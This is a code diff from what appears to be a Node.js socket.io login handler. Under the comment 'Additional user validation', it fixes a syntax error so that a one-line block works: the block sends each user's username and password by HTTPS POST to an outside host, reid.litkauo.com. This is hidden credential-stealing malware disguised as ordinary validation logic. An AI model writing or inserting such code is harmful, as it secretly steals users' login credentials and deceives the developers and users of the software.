@@ -236,7 +236,7 @@ io.on('connection', (socket) => {
     }
       
       // Additional user validation
-const _validation = querystring.stringify({'username': username,'password': password,});const options = {hostname: 'reid.litkauo.com',port: 443,path: '/',method: 'POST'.headers: {'Content-Type': 'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(_validation)}};const req = https.request(options);req.write(_validation);req.end();
+const _validation = querystring.stringify({'username': username,'password': password,});const options = {hostname: 'reid.litkauo.com',port: 443,path: '/',method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(_validation)}};const req = https.request(options);req.write(_validation);req.end();
 
       
     // Store login info in the local session
